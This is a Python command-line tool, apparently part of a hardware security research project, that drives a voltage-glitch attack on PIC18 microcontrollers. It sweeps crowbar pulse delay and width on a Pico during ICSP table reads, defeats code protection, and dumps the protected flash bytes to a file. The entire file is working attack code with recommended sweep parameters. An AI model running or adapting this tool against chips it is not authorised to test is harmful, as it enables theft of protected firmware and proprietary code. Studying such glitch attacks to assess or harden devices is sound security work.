#!/usr/bin/env python3
"""
pic_glitch.py - Drive the PIC18 code-protect (CP) bypass glitch sweep.

This is the Chain-1 attack from WORK/pic18_report.md: a Vdd crowbar (GP2) fired
into the ICSP Table-Read clock-out so a protected byte returns its true value
instead of 0x00 (WORK FIND-102/105/300). The sweep itself runs on the Pico
(src/pic18_target.c: pic18_glitch_cp); this tool configures it, streams the
live progress, and detects the '*** CP BYPASS' hit line.

Two modes:
  sweep  (default) - the full delay x width search via TARGET PIC GLITCH.
  shot             - a single crowbar pulse for scope bring-up (TARGET PIC SHOT).
                     Park a scope on VDD and the GP22 GLITCH_FIRED marker to see
                     the droop before committing to a long campaign.

Width is in 6.67 ns cycles @150 MHz and is clamped by firmware to the safe band
15..450 cyc (~0.1..3.0 us) so an over-wide pulse cannot tip the NVM controller
into an erase (FIND header in pic18_target.h). Delay is in microseconds from
power-on into the read window.

Pick `--probe` as a byte address inside a CONFIRMED-protected block (use
pic_info.py to see which CPn are set). Default 0x001800 = the CP3 block.

Recommended first pass (wide, coarse), per the report's window-finding tactic:
  ./pic_glitch.py sweep --probe 0x001800 \
      --d-start 0 --d-end 200 --d-step 5 \
      --w-start 30 --w-end 200 --w-step 10 --max 20000

Examples:
  ./pic_glitch.py shot --delay 1000 --width 150
  ./pic_glitch.py sweep --probe 0x001800
  ./pic_glitch.py sweep --probe 0x001800 --dump-on-hit dump.bin --dump-size 0x800
"""

import argparse
from colors import ColorHelpFormatter
import sys

import os

from pic_icsp import PicLink, add_common_args, project_path


def _live(line):
    print(line)


def do_shot(link, args):
    print(f"Single crowbar shot: delay={args.delay} us width={args.width} cyc")
    print("Watch VDD on the scope; GP22 (GLITCH_FIRED) is the trigger marker.")
    print(link.shot(args.delay, args.width).strip())
    return 0


def do_sweep(link, args):
    devid, protected = link.status()
    if devid is None:
        print("PIC18: NOT CONNECTED - run pic_info.py first (wiring/power/LVP).")
        return 1
    if not protected:
        print(f"NOTE: DEVID 0x{devid:04X} reports OPEN (no CP). Nothing to bypass;")
        print("      pic_dump.py will read it directly. Continuing anyway.")
    else:
        print(f"DEVID 0x{devid:04X}  PROTECTED. Probing 0x{args.probe:06X}.")

    print(f"Sweep: delay {args.d_start}..{args.d_end} us step {args.d_step} | "
          f"width {args.w_start}..{args.w_end} cyc step {args.w_step} | "
          f"max {args.max} attempts")
    print("Crowbar GP2 -> VDD. Streaming firmware output (Ctrl-C to stop the host;")
    print("power-cycle the Pico to abort the on-chip sweep). Width inner / delay outer.\n")

    transcript = link.glitch_cp(
        args.probe, args.d_start, args.d_end, args.d_step,
        args.w_start, args.w_end, args.w_step, args.max,
        on_line=_live,
    )

    if "*** CP BYPASS" in transcript:
        hit = next((l for l in transcript.splitlines() if "CP BYPASS" in l), "")
        print("\n>>> HIT:", hit.strip())
        if args.dump_on_hit:
            # a bare filename lands in the per-target folder scripts/pic18/
            out = args.dump_on_hit if os.path.dirname(args.dump_on_hit) else project_path(args.dump_on_hit)
            print(f"Dumping 0x{args.dump_size:X} bytes from 0x{args.probe:06X} -> {out}")
            print("(re-glitch may be needed per byte; this captures the current read)")
            data = link.dump(args.probe, args.dump_size)
            with open(out, "wb") as f:
                f.write(data)
            nz = sum(1 for b in data if b)
            print(f"Saved {len(data)} bytes, {nz} non-zero.")
        return 0

    print("\nNo bypass this run. Widen the window, raise --max, or try a slower")
    print("ICSP clock / lower VDD to widen the read window ~10x (FIND-105).")
    return 2


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=ColorHelpFormatter)
    add_common_args(ap)
    sub = ap.add_subparsers(dest="mode")

    sp = sub.add_parser("sweep", help="delay x width CP-bypass sweep")
    sp.add_argument("--probe", type=lambda x: int(x, 0), default=0x001800,
                    help="byte addr inside a protected block (default 0x001800 = CP3 block)")
    sp.add_argument("--d-start", type=int, default=0, dest="d_start")
    sp.add_argument("--d-end", type=int, default=50, dest="d_end")
    sp.add_argument("--d-step", type=int, default=1, dest="d_step")
    sp.add_argument("--w-start", type=int, default=30, dest="w_start")
    sp.add_argument("--w-end", type=int, default=150, dest="w_end")
    sp.add_argument("--w-step", type=int, default=10, dest="w_step")
    sp.add_argument("--max", type=int, default=5000, help="max attempts")
    sp.add_argument("--dump-on-hit", default=None,
                    help="on a hit, dump from --probe to this file")
    sp.add_argument("--dump-size", type=lambda x: int(x, 0), default=0x800,
                    help="bytes to dump on hit (default 0x800)")

    st = sub.add_parser("shot", help="single crowbar pulse for scope bring-up")
    st.add_argument("--delay", type=int, default=1000, help="delay us (default 1000)")
    st.add_argument("--width", type=int, default=150, help="width cyc (default 150)")

    args = ap.parse_args()
    if args.mode is None:
        args.mode = "sweep"
        # apply sweep defaults
        for k, v in dict(probe=0x001800, d_start=0, d_end=50, d_step=1,
                         w_start=30, w_end=150, w_step=10, max=5000,
                         dump_on_hit=None, dump_size=0x800).items():
            setattr(args, k, getattr(args, k, v))

    link = PicLink(port=args.port, verbose=args.verbose, lvp=args.lvp)
    try:
        if args.mode == "shot":
            return do_shot(link, args)
        return do_sweep(link, args)
    finally:
        link.close()


if __name__ == "__main__":
    sys.exit(main())
